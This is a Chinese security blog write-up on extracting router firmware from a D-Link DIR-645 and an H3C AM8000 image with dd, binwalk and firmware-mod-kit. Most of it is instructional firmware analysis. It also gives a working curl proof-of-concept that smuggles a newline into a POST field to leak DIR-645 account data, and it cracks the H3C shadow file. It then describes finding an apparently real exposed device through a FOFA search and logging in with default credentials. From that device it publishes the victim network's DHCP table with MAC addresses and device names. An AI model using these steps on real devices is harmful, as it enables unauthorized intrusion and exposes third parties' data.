<!DOCTYPE html>
<html>
<style>
.navbar-hide{
	display: none;
}
</style>
	<head>
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="© 关于哨兵，这是一个与哨兵安全相关的简述。">
<meta name="keywords" content="网络安全,哨兵安全,Cyber Security,Open Source">
<meta name="author" content="Sentry Security">
<link rel="shortcut icon" href="/static/img/favicon.png">
<title> Router-BinFile-Analysis  © 关于哨兵 | 哨兵安全实验室</title>
<!--<base target="_blank" />-->
<link rel="stylesheet" href="/static/css/bootstrap.css">
<link rel="stylesheet" href="/static/css/bootstrap-select.min.css">
<link rel="stylesheet" href="/static/css/font-awesome.min.css" >
<link rel="stylesheet" href="/static/css/spinkit.css">
<link rel="stylesheet" href="/static/css/style.css">
<link rel="stylesheet" type="text/css" href="/static/css/pace-minimal.css">

<script src="/static/js/jquery.min.js"></script>
<!--jquery sticky js source files add-->
<script src="/static/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
<!--jquery sticky js source files add stop-->
<script src="/static/js/bootstrap.min.js"></script>
<script src="/static/js/bootstrap-select.min.js"></script>
<script src="/static/js/pace.min.js"></script>

<!--start-->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
        inlineMath: [['$$','$$']]
      }
    });
  </script>
<script src="/static/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
<!--https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js shuxue gongshi. stop-->

<script src="/static/js/vue.min.js"></script>
<script src="/static/js/timeago.min.js"></script>

<script src="/static/js/markup.min.js"></script>
<script src="/static/js/webfont.js"></script>
<script src="/static/js/thuhidden.js"></script>

</head>

<body>
	<div class="navbar navbar-default" role="navigation">
  <div class="container">
    <div class="navbar-header">
      
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      
			<a class="navbar-brand" href="/">
				<span class="thuhidden">
					
					<picture>
						
						<source 
						
							srcset="/static/img/logo-small-dark.png 1x,
											/static/img/logo-small-dark@2x.png 2x,
											/static/img/logo-small-dark@3x.png 3x,
											/static/img/logo-small-dark@4x.png 4x"
						
							media="(prefers-color-scheme: dark)"/>
						
						
						<img src="/static/img/logo-small.png" 
							srcset="/static/img/logo-small.png 1x, 
											/static/img/logo-small@2x.png 2x, 
											/static/img/logo-small@3x.png 3x, 
											/static/img/logo-small@4x.png 4x"
							alt=""/>
						
					</picture>
					
					</span>关于我的一些自述
			</a>
    </div>
    <div class="navbar-collapse collapse navbar-right">
      <ul class="nav navbar-nav" role="menubar">
        
        
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn">HOME</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/blog">BLOG</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/events">EVENT</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/categories">CATEGORIES</a></li>
        <li role="none"><a role="menuitem" href="https://www.sentrylab.cn/daily">DAILY</a></li>
        <li class="active"><a href="/">ABOUT ME</a></li>

        
       
      </ul>
    </div><!--/.nav-collapse -->
  </div>
</div>




<script>
	window.mirrorId = "Router-BinFile-Analysis";
</script>


<div id="help-page">
	<div class="container">
	  <div class="row">
		  <div class="col-sm-3 hidden-xs">
				<ul class="nav nav-pills nav-stacked" id="help-nav">
					
					<li id="toc-ATT&CK - 基于 scylla 的访问代理池"><a href="/help/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/"><code-index-css>ATT&CK - 基于 scylla 的访问代理池</code-index-css></a></li>
					
					<li id="toc-CTF - 代码审计向"><a href="/help/CTF-Code-Audit-WalkThrough/"><code-index-css>CTF - 代码审计向</code-index-css></a></li>
					
					<li id="toc-CTF - 密码学与杂项"><a href="/help/CTF-Crypto-and-Misc-etc-WalkThrough/"><code-index-css>CTF - 密码学与杂项</code-index-css></a></li>
					
					<li id="toc-Dynamic-analysis-of-java-framework-code"><a href="/help/Dynamic-analysis-of-java-framework-code/"><code-index-css>Dynamic-analysis-of-java-framework-code</code-index-css></a></li>
					
					<li id="toc-Hikvision-ConfigurationFiles-decrypter"><a href="/help/Hikvision-ConfigurationFiles-decrypter/"><code-index-css>Hikvision-ConfigurationFiles-decrypter</code-index-css></a></li>
					
					<li id="toc-JRMP-Gadget"><a href="/help/JRMP-Gadget/"><code-index-css>JRMP-Gadget</code-index-css></a></li>
					
					<li id="toc-Mod-Waf-Bypass-Walkthrough"><a href="/help/Mod-Waf-Bypass-Walkthrough/"><code-index-css>Mod-Waf-Bypass-Walkthrough</code-index-css></a></li>
					
					<li id="toc-ModSec & CloudFlare WAF Initial Research"><a href="/help/WAF-developed-by-Grayscale-forwarding/"><code-index-css>ModSec & CloudFlare WAF Initial Research</code-index-css></a></li>
					
					<li class="active" id="toc-Router-BinFile-Analysis"><a href="/help/Router-BinFile-Analysis/"><code-index-css>Router-BinFile-Analysis</code-index-css></a></li>
					
					<li id="toc-SQL注入原理分析"><a href="/help/ALL-SQL-INJECTION-ANALYSIS/"><code-index-css>SQL注入原理分析</code-index-css></a></li>
					
					<li id="toc-ShiroDeser"><a href="/help/ShiroDeser/"><code-index-css>ShiroDeser</code-index-css></a></li>
					
					<li id="toc-SpringBoot-Memory-files-heapdump-Analysis"><a href="/help/SpringBoot-Memory-files-heapdump-Analysis/"><code-index-css>SpringBoot-Memory-files-heapdump-Analysis</code-index-css></a></li>
					
					<li id="toc-Struts2Deser"><a href="/help/Struts2Deser/"><code-index-css>Struts2Deser</code-index-css></a></li>
					
					<li id="toc-javaDeser"><a href="/help/javaDeser/"><code-index-css>javaDeser</code-index-css></a></li>
					
					<li id="toc-polkit-CVE-2021-3560"><a href="/help/polkit-CVE-2021-3560/"><code-index-css>polkit-CVE-2021-3560</code-index-css></a></li>
					
					<li id="toc-基于内存的Shiro框架Webshell攻击研究"><a href="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/"><code-index-css>基于内存的Shiro框架Webshell攻击研究</code-index-css></a></li>
					
					<li id="toc-安全与开发之：Maven构建排错"><a href="/help/ALL-mvn-build-errors/"><code-index-css>安全与开发之：Maven构建排错</code-index-css></a></li>
					
					<li id="toc-浪潮ClusterEngineV4.0代码审计历程"><a href="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/"><code-index-css>浪潮ClusterEngineV4.0代码审计历程</code-index-css></a></li>
					
					<li id="toc-通达OA利用代码分析"><a href="/help/ToDa-OA-VulnPoc-by-java-analysis/"><code-index-css>通达OA利用代码分析</code-index-css></a></li>
					
				</ul>
				
				
				<div id="sticky-wrapper" class="sticky-wrapper" style="height: 200px;">
					<li class="nav nav-pills nav-stacked" id="help-nav">
						<code-index-css>
							<details open class="article-index" style="overflow: visible;">
								<summary class="point">文章目录&nbsp &nbsp</summary>
								<div class="hline"></div>
								<div class="spacing"></div>
								<ul id="toc" class="section-nav">
<li class="toc-entry toc-h2"><a href="#零dlink-dir645a1_fw102b08">零：DLink-DIR645A1_FW102B08</a>
<ul>
<li class="toc-entry toc-h3"><a href="#0x01手动提取hsqs-systemfiles">0x01：手动提取hsqs systemfiles</a>
<ul>
<li class="toc-entry toc-h4"><a href="#-why-hsqs"># Why hsqs?</a></li>
<li class="toc-entry toc-h4"><a href="#-寻找这个快递的运单"># 寻找这个快递的运单:)</a></li>
<li class="toc-entry toc-h4"><a href="#-打开快递盒子"># 打开快递盒子:)</a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x02-binwalk提取hsqs-systemfiles">0x02 Binwalk提取hsqs systemfiles</a></li>
<li class="toc-entry toc-h3"><a href="#0x03-dir-645敏感信息泄露">0x03 DIR-645敏感信息泄露</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#一h3c-am8000v100r008">一：H3C-AM8000V100R008</a>
<ul>
<li class="toc-entry toc-h3"><a href="#1x01-binwalk提取systemfiles">1x01 binwalk提取systemfiles</a></li>
<li class="toc-entry toc-h3"><a href="#1x02-默认帐号密码">1x02 默认帐号密码</a>
<ul>
<li class="toc-entry toc-h4"><a href="#-来自杭州的幸运儿"># 来自杭州的幸运儿</a></li>
<li class="toc-entry toc-h4"><a href="#未完待续">[未完待续…]</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#参考">参考</a></li>
</ul>
							</details>
						</code-index-css>
					</li>
				</div>
				 


				<!--click this icon -> scroll to top of page; code from anquanke. also this icon func are under-construction-->		
				<!-- <div class="back-to-top" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 500);" style="position: fixed;bottom:400px;right: 20px;height: 40px;width: 40px;background-color: #1dada7;border-radius: 50%;text-align: center;cursor: pointer">
					<img src="https://p0.ssl.qhimg.com/t0179ac3294ef926b8c.png" style="width:30px;margin-top: 6px;">
				</div> -->


			</div><!-- sidenave -->
			<div class="col-sm-9">
				<div class="visible-xs">
					<form class="form-inline">
						<div class="form-group">
							<label>选择: </label>
							<select class="form-control" id="help-select">
								
								<option data-help-url="/help/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/" id="toc-ATT&CK - 基于 scylla 的访问代理池">ATT&CK - 基于 scylla 的访问代理池</option>
								
								<option data-help-url="/help/CTF-Code-Audit-WalkThrough/" id="toc-CTF - 代码审计向">CTF - 代码审计向</option>
								
								<option data-help-url="/help/CTF-Crypto-and-Misc-etc-WalkThrough/" id="toc-CTF - 密码学与杂项">CTF - 密码学与杂项</option>
								
								<option data-help-url="/help/Dynamic-analysis-of-java-framework-code/" id="toc-Dynamic-analysis-of-java-framework-code">Dynamic-analysis-of-java-framework-code</option>
								
								<option data-help-url="/help/Hikvision-ConfigurationFiles-decrypter/" id="toc-Hikvision-ConfigurationFiles-decrypter">Hikvision-ConfigurationFiles-decrypter</option>
								
								<option data-help-url="/help/JRMP-Gadget/" id="toc-JRMP-Gadget">JRMP-Gadget</option>
								
								<option data-help-url="/help/Mod-Waf-Bypass-Walkthrough/" id="toc-Mod-Waf-Bypass-Walkthrough">Mod-Waf-Bypass-Walkthrough</option>
								
								<option data-help-url="/help/WAF-developed-by-Grayscale-forwarding/" id="toc-ModSec & CloudFlare WAF Initial Research">ModSec & CloudFlare WAF Initial Research</option>
								
								<option data-help-url="/help/Router-BinFile-Analysis/" selected id="toc-Router-BinFile-Analysis">Router-BinFile-Analysis</option>
								
								<option data-help-url="/help/ALL-SQL-INJECTION-ANALYSIS/" id="toc-SQL注入原理分析">SQL注入原理分析</option>
								
								<option data-help-url="/help/ShiroDeser/" id="toc-ShiroDeser">ShiroDeser</option>
								
								<option data-help-url="/help/SpringBoot-Memory-files-heapdump-Analysis/" id="toc-SpringBoot-Memory-files-heapdump-Analysis">SpringBoot-Memory-files-heapdump-Analysis</option>
								
								<option data-help-url="/help/Struts2Deser/" id="toc-Struts2Deser">Struts2Deser</option>
								
								<option data-help-url="/help/javaDeser/" id="toc-javaDeser">javaDeser</option>
								
								<option data-help-url="/help/polkit-CVE-2021-3560/" id="toc-polkit-CVE-2021-3560">polkit-CVE-2021-3560</option>
								
								<option data-help-url="/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/" id="toc-基于内存的Shiro框架Webshell攻击研究">基于内存的Shiro框架Webshell攻击研究</option>
								
								<option data-help-url="/help/ALL-mvn-build-errors/" id="toc-安全与开发之：Maven构建排错">安全与开发之：Maven构建排错</option>
								
								<option data-help-url="/help/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/" id="toc-浪潮ClusterEngineV4.0代码审计历程">浪潮ClusterEngineV4.0代码审计历程</option>
								
								<option data-help-url="/help/ToDa-OA-VulnPoc-by-java-analysis/" id="toc-通达OA利用代码分析">通达OA利用代码分析</option>
								
							</select>
						</div>
					</form>
				</div>
				<div id="help-content">

				<center>
					
					<csmall>本文最后修改于：<em>2021-07-08</em></csmall>
					
				<csmall><em> | Sentry Security | 哨兵安全实验室</em></csmall>
				</center>

					<div class="hline"></div>
					<div class="spacing"></div>

					<p>本文主要记录了Router固件提取的过程，丰富相关从业方向的经验；也是第一个跟着教程提取出的固件，过程有些曲折，分享一些心路历程和提取思路。</p>

<ul>
  <li>VM Ubuntu 18</li>
  <li>Binwalk</li>
  <li><a href="https://github.com/mirror/firmware-mod-kit" target="_blank">firmware-mod-kit</a></li>
</ul>

<p>Ubuntu 本地VM镜像安装、换源什么的就不赘述了；需要了解的朋友移步搜索引擎；</p>

<h2 id="零dlink-dir645a1_fw102b08">零：<em>DLink-DIR645A1_FW102B08</em></h2>

<ul>
  <li>下载地址：<a href="https://ftp.dlink.ru/pub/Router/DIR-645/Firmware/Old/" target="_blank"><em>DLink - ftp.dlink.ru node</em></a></li>
</ul>

<p>下载<code class="language-plaintext highlighter-rouge">bin</code>后缀的文件；路由器固件可以理解为一个嵌入式系统，是路由器所使用的操作系统，我们日常中使用的像本文中提及到的Ubuntu 18在虚拟机中运行占用容量动辄2G以上，路由器主要功能为拨号、无线等上网用途，功能较为单一，所以主流Linux/BSD发行版镜像则不适用，所以市面上有很多魔改的、适用于路由器的嵌入式系统；</p>

\[{Tips.来自维基百科^{[1]}}\]

<ul>
  <li>基于Linux
    <ul>
      <li>OpenWrt
        <ul>
          <li>Commotion Wireless</li>
        </ul>
      </li>
      <li>DebWRT</li>
      <li>HyperWRT</li>
      <li>Padavan</li>
      <li>…</li>
    </ul>
  </li>
  <li>基于BSD Unix内核
    <ul>
      <li>FreeBSD - 自由及开放源代码操作系统（采用BSD授权条款）
        <ul>
          <li>zrouter</li>
          <li>BSD Router Project</li>
          <li>m0n0wall</li>
          <li>pfsense</li>
          <li>OPNsense</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<p>背景就介绍一些，有兴趣可以移步<a href="https://zh.m.wikipedia.org/wiki/%E5%AE%A2%E8%A3%BD%E5%8C%96%E8%B7%AF%E7%94%B1%E5%99%A8%E9%9F%8C%E9%AB%94%E6%B8%85%E5%96%AE" target="_blank"><em>WIKI PEDIA [1]</em></a></p>

<p>所以此时我们就拿到了<code class="language-plaintext highlighter-rouge">DIR645A1_FW102B08</code>版本的固件，拿到<em>快递</em>的第一步当然是拆快递；</p>

<h3 id="0x01手动提取hsqs-systemfiles">0x01：手动提取<em>hsqs systemfiles</em></h3>

<blockquote>
  <p><em>Tips：</em></p>

  <blockquote>
    <p>Squashfs（.sfs）是一套供Linux核心使用的GPL开源只读压缩文件系统，具有超高压缩率，其压缩率最高可达34%。</p>
  </blockquote>
</blockquote>

<p>手动判断文件类型：</p>

<blockquote>
  <p>1) <code class="language-plaintext highlighter-rouge">strings | grep</code> 检索文件系统magic签名头</p>

  <p>2) <code class="language-plaintext highlighter-rouge">hexdump | grep</code> 检索magic签名偏移</p>

  <p>3) <code class="language-plaintext highlighter-rouge">dd | file</code> 确定magic签名偏移处的文件类型</p>
</blockquote>

<h4 id="-why-hsqs"># <em>Why hsqs?</em></h4>

<ul>
  <li>问：为什么是在文件中检索<code class="language-plaintext highlighter-rouge">hsqs</code>？</li>
  <li>回答：可识别字符特征</li>
</ul>

<p>例如我们可以通过<code class="language-plaintext highlighter-rouge">JSESSIONID COOKIE</code>来判断出这是一个J2EE系统，但是我们并不能判断这个系统是否集成了<code class="language-plaintext highlighter-rouge">Apache Shiro</code>，所以我们需要进一步通过<code class="language-plaintext highlighter-rouge">rememeberMe COOKIE</code>来判断，更有甚者则需要通过<a href="/help/JRMP-Gadget/" target="_blank">人工来寻找路由判断</a>；</p>

<p>所以此处的文件类型判断同样，文件系统magic签名头是指一个文件系统中包含的一串可识别字符，有了这串字符，表明该文件可能包含某个文件系统；当然，如果要确定是否包含某文件系统，还需要利用其他条件配合证明，也就是2、3步骤需要做。</p>

<h4 id="-寻找这个快递的运单"># 寻找这个快递的运单:)</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ strings DIR645A1_FW102B08.bin | <span class="nb">grep</span> <span class="s2">"hsqs"</span>             
hsqs

➜ hexdump <span class="nt">-C</span> DIR645A1_FW102B08.bin | <span class="nb">grep</span> <span class="nt">-n</span> <span class="s2">"hsqs"</span>
88066:00160090  68 73 71 73 a3 07 00 00  29 64 cc 4e 00 00 01 00  |hsqs....<span class="o">)</span>d.N....|
</code></pre></div></div>
<p>在偏移<code class="language-plaintext highlighter-rouge">0x160090</code>发现了<code class="language-plaintext highlighter-rouge">hsqs</code>，16进制转化为10进制得<strong>1441936</strong>，复制签名偏移的文件类型大小 ≤ <em>100bytes</em>即可：</p>

<blockquote>
  <p><em>Tips：</em></p>

  <blockquote>
    <p>通常复制100字节的数据，是因为squashfs文件系统的头部校验不会超过100字节
简而言之：此处提取出来的100字节大小的squash可以类比成快递运单，运单上详细记录着快递类型、快递大小等托运物相关信息；</p>
  </blockquote>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ <span class="nb">dd </span><span class="k">if</span><span class="o">=</span>DIR645A1_FW102B08.bin <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">count</span><span class="o">=</span>100 <span class="nv">skip</span><span class="o">=</span>1441936 <span class="nv">of</span><span class="o">=</span>squash
100+0 records <span class="k">in
</span>100+0 records out
100 bytes copied, 0.0387127 s, 2.6 kB/s

➜ file squash 
squash: Squashfs filesystem, little endian, version 4.0, 5958022 bytes, 1955 inodes, blocksize: 65536 bytes, created: Wed Nov 23 03:10:33 2011
</code></pre></div></div>
<p>我们看到运单显示：<code class="language-plaintext highlighter-rouge">类型 Squashfs filesystem ，大小 5958022 bytes ，创建时间 Wed Nov 23 03:10:33 2011</code>，当然这也是我们下一步所需要的参数；</p>

<p><code class="language-plaintext highlighter-rouge">dd if=DIR645A1_FW102B08.bin bs=1 count=5958022 skip=1441936 of=kernel.squash</code>命令输出数据文件</p>

<h4 id="-打开快递盒子"># 打开快递盒子:)</h4>

<p>用到的工具：<a href="https://github.com/mirror/firmware-mod-kit" target="_blank">firmware-mod-kit</a></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/mirror/firmware-mod-kit.git
<span class="nv">$ </span><span class="nb">sudo </span>apt-get <span class="nb">install </span>build-essential zlib1g-dev liblzma-dev python-magic
<span class="nv">$ </span><span class="nb">cd </span>firmware-mod-kit/src
<span class="nv">$ </span>./configure <span class="o">&amp;&amp;</span> make
<span class="c">##这里顺便一提：ln: failed to create hard link 'uncomp_r.c' =&gt; 'uncomp.c': Operation not permitted</span>
<span class="c">##报错是操作不被允许，因为我图省事宿主机共享了一个文件夹给虚拟机，make操作都是在共享文件夹下，导致权限存在问题</span>
<span class="nv">$ </span>make clean
<span class="nv">$ </span><span class="nb">mv </span>firmware-mod-kit/<span class="k">*</span> ~/Desktop/firmware-mod-kit/ <span class="o">&amp;&amp;</span> <span class="nb">cd </span>firmware-mod-kit/src 
<span class="nv">$ </span>./configure <span class="o">&amp;&amp;</span> make
<span class="c">##紧接着直接对kernel.squash进行解包即可</span>
<span class="nv">$ </span><span class="nb">cd</span> ../ <span class="o">&amp;&amp;</span> ./unsquashfs_all.sh ../kernel.squash
</code></pre></div></div>

<p><img src="https://i.loli.net/2021/07/16/NyGEhMbqeTm3rOQ.png" alt="截屏2021-07-14 下午3.39.43.png" /></p>

<p>上图红字步骤依次从上到下：</p>
<ul>
  <li>1.success in local fold.</li>
  <li>2.make error : ln: failed to create hard link ‘uncomp_r.c’ =&gt; ‘uncomp.c’: Operation not permitted.</li>
  <li>3.提取成功</li>
</ul>

<h3 id="0x02-binwalk提取hsqs-systemfiles">0x02 <em>Binwalk</em>提取<em>hsqs systemfiles</em></h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk <span class="nt">-Me</span> DIR645A1_FW102B08.bin
<span class="nv">$ </span><span class="nb">cd </span>_DIR645A1_FW102B08.bin.extracted/
<span class="nv">$ </span>/<span class="o">{</span>path/to/firmware-mod-kit<span class="o">}</span>/unsquashfs_all.sh 160090.squashfs
</code></pre></div></div>
<p>同样解出；
<img src="https://i.loli.net/2021/07/16/TJiGF8ov4OW5gNH.png" alt="截屏2021-07-14 下午2.51.53.png" /></p>

<p>图片红字步骤依次从上到下：</p>
<ul>
  <li>1.binwalk解出<code class="language-plaintext highlighter-rouge">.squashfs</code>文件后需手动使用unsquashfs_all脚本解包</li>
  <li>2.两种方法之间的过程比较</li>
</ul>

<h3 id="0x03-dir-645敏感信息泄露">0x03 <em>DIR-645</em>敏感信息泄露</h3>

<ul>
  <li><code class="language-plaintext highlighter-rouge">htdocs/web/getcfg.php</code></li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="no">OK</span>
<span class="nc">Content</span><span class="o">-</span><span class="nc">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">xml</span>

<span class="o">&lt;?</span><span class="k">echo</span> <span class="s2">"&lt;?"</span><span class="p">;</span><span class="cp">?&gt;</span>xml version="1.0" encoding="utf-8"<span class="cp">&lt;?</span><span class="k">echo</span> <span class="s2">"?&gt;"</span><span class="p">;</span><span class="cp">?&gt;</span>
<span class="nt">&lt;postxml&gt;</span>
<span class="cp">&lt;?</span> <span class="k">include</span> <span class="s2">"/htdocs/phplib/trace.php"</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"CACHE"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"true"</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">echo</span> <span class="nf">dump</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">"/runtime/session/"</span><span class="mf">.</span><span class="nv">$SESSION_UID</span><span class="mf">.</span><span class="s2">"/postxml"</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
	<span class="cm">/* cut_count() will return 0 when no or only one token. */</span>
	<span class="nv">$SERVICE_COUNT</span> <span class="o">=</span> <span class="nf">cut_count</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"SERVICES"</span><span class="p">],</span> <span class="s2">","</span><span class="p">);</span>
	<span class="nf">TRACE_debug</span><span class="p">(</span><span class="s2">"GETCFG: got "</span><span class="mf">.</span><span class="nv">$SERVICE_COUNT</span><span class="mf">.</span><span class="s2">" service(s): "</span><span class="mf">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"SERVICES"</span><span class="p">]);</span>
	<span class="nv">$SERVICE_INDEX</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">while</span> <span class="p">(</span><span class="nv">$SERVICE_INDEX</span> <span class="o">&lt;</span> <span class="nv">$SERVICE_COUNT</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="nv">$GETCFG_SVC</span> <span class="o">=</span> <span class="nf">cut</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"SERVICES"</span><span class="p">],</span> <span class="nv">$SERVICE_INDEX</span><span class="p">,</span> <span class="s2">","</span><span class="p">);</span>
		<span class="nf">TRACE_debug</span><span class="p">(</span><span class="s2">"GETCFG: serivce["</span><span class="mf">.</span><span class="nv">$SERVICE_INDEX</span><span class="mf">.</span><span class="s2">"] = "</span><span class="mf">.</span><span class="nv">$GETCFG_SVC</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$GETCFG_SVC</span><span class="o">!=</span><span class="s2">""</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="nv">$file</span> <span class="o">=</span> <span class="s2">"/htdocs/webinc/getcfg/"</span><span class="mf">.</span><span class="nv">$GETCFG_SVC</span><span class="mf">.</span><span class="s2">".xml.php"</span><span class="p">;</span>
			<span class="cm">/* GETCFG_SVC will be passed to the child process. */</span>
			<span class="k">if</span> <span class="p">(</span><span class="nf">isfile</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">==</span><span class="s2">"1"</span><span class="p">)</span> <span class="nf">dophp</span><span class="p">(</span><span class="s2">"load"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="nv">$SERVICE_INDEX</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="nt">&lt;/postxml&gt;</span>
</code></pre></div></div>

<p><img src="https://i.loli.net/2021/07/16/QxocdSr2PITnA9J.png" alt="截屏2021-07-16 下午3.55.48.png" /></p>

<p><code class="language-plaintext highlighter-rouge">Poc: curl -d "SERVICES=DEVICE.ACCOUNT&amp;attack=ture%0aAUTHORIZED_GROUP=1" "http://{ip.addr}:{ip.port}/info/getcfg.php"</code></p>

<h2 id="一h3c-am8000v100r008">一：<em>H3C-AM8000V100R008</em></h2>

<ul>
  <li>下载地址：<a href="https://download.h3c.com.cn/download.do?id=2280937"><em>H3C - AM8000V100R008</em></a></li>
</ul>

<h3 id="1x01-binwalk提取systemfiles">1x01 <em>binwalk</em>提取<em>systemfiles</em></h3>

<p>官网显示是2015年上传的包，下载下来直接在ubuntu里解包<code class="language-plaintext highlighter-rouge">➜ binwalk -Me AM8000V100R008.bin</code>，尴尬的是所有的文件就直接出来了么</p>

<p><img src="https://i.loli.net/2021/08/12/gZJaWD2EswuilcN.png" alt="截屏2021-08-12 下午4.42.31.png" /></p>

<p>发现<code class="language-plaintext highlighter-rouge">shadow</code>，解出来看看：<code class="language-plaintext highlighter-rouge">➜ john -format=md5crypt {file/path}  &amp;&amp; john --show {file/path}</code></p>

<p><img src="https://i.loli.net/2021/08/12/gmQKfkXq5w2nDsA.png" alt="截屏2021-08-12 下午4.45.13.png" /></p>

<h3 id="1x02-默认帐号密码">1x02 默认帐号密码</h3>

<blockquote>
  <p>fofa: userLogin.asp</p>
</blockquote>

<p>既然有了默认账号密码，去找找看有没有<code class="language-plaintext highlighter-rouge">幸运儿</code>，查看<code class="language-plaintext highlighter-rouge">web.config</code>入口文件为<code class="language-plaintext highlighter-rouge">userLogin.asp</code>，那就直接指定语法；</p>

<h4 id="-来自杭州的幸运儿"># 来自杭州的幸运儿</h4>

<p><img src="https://i.loli.net/2021/08/13/IoJDbNSjw61398x.png" alt="截屏2021-08-13 上午11.25.22.png" /></p>

<p>不光弱口令，还映射了n个内网端口到公网上，映射出来的端口是Hikvison的视频流端口和web管理，就不贴图了可以参考<a href="/help/Hikvision-ConfigurationFiles-decrypter">Hikvision-ConfigurationFiles-decrypter</a>；</p>

<p>另外附上部分dhcp指向表自行感受一下：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5	F4:83:CD:00:62:CD	192.168.x.7	TL-WDR5600
6	18:87:40:96:43:7F	192.168.x.8	RedmiK305G-2510
7	58:6B:14:26:B4:4C	192.168.x.9	guoqingdeiPhone
8	4C:CC:6A:AA:D0:45	192.168.x.10	wp-pjb
9	74:27:EA:AC:44:2D	192.168.x.11	yjy-jcb
10	40:F2:E9:37:04:96	192.168.x.13	IMM2-40f2e93704
</code></pre></div></div>
<p>当然也是支持<code class="language-plaintext highlighter-rouge">telnet</code>连接的：</p>

<p><img src="https://i.loli.net/2021/08/13/ZzPJSMpRnKqVNUQ.png" alt="截屏2021-08-13 上午11.36.26.png" /></p>

<h4 id="未完待续">[未完待续…]</h4>

<h2 id="参考">参考</h2>

<ul>
  <li><a href="https://www.cnblogs.com/blacksunny/p/7208451.html" target="_blank">路由器文件系统与提取</a></li>
  <li><a href="https://sabersauce.github.io/2016/07/28/squashFS-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" target="_blank">squashFS 文件系统</a></li>
  <li><a href="https://www.anquanke.com/post/id/245530" target="_blank">路由器固件下的小试牛刀</a></li>
</ul>



				</div>
				<div class="spacing"></div>
	            <div>
	<div class="hline"></div>
	<h3><em>#</em> 申明</h3>
	<div class="spacing"></div>
	<h4><em>By: Bin4xin.</em></h4>
	<h4>转载请申明本文链接：<a href="/help/Router-BinFile-Analysis/" target="_blank"><code-index-css>《<em>Router Binfile Analysis</em>》</code-index-css></a></h4>

	<h3><em># Any Questions</em></h3>
	<div class="spacing"></div>
	<h4> >_ 对本文进行提问：<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://github.com/Bin4xin/bin4xin.github.io/blob/1b4fffa6232dc6ffa2cece8be0d6c39e0c5f9cfe/help/Router-BinFile-Analysis/index.html%23L84" target="_blank"> <em><li class="fa fa-github"></li> Reference in new issue.</em></a></h4>

	<h4> >_ 对本文进行留言：<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://about.sentrylab.cn/help/Router-BinFile-Analysis/" target="_blank"> <em><li class="fa fa-github"></li> Leave a Comment.</em></a></h4>
</div>
			</div><!-- help content -->
	  </div>
	</div><!--/container -->
</div><!--/mirrors -->
	


<div id="footerwrap" class="tuna-foot-1">
<div class="container">
    <div class="row">
            <div class="col-sm-4">
                <div class="col-sm-6">
                  <p class="thuhidden"><strong>入门</strong></p>
                  <p class="thuhidden"><a href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll</em>源码</a></p>
